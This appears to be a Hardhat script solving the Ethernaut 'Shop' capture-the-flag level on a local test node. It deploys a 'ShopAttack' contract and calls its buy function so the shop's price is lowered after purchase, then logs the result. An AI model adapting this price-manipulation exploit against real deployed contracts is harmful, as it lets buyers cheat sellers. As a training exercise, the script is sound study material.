import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x625A692E96605c988192cd59563e5EB2f1E33C87";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Shop",CONTRACT_ADDRESS, signer);

const attackerContractFactory = await ethers.getContractFactory("ShopAttack", signer);
const attackerContract = await attackerContractFactory.deploy(contract.address);

//HACK STEPS 

// 1. Check isSold boolean
console.log("Current product is sold? ", await contract.isSold());

// 2. Call buy function from attacker contract and check current price and isSold.
await attackerContract.callBuy();
console.log("Price got updated to:", await contract.price());
console.log("Current product is sold? ", await contract.isSold());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
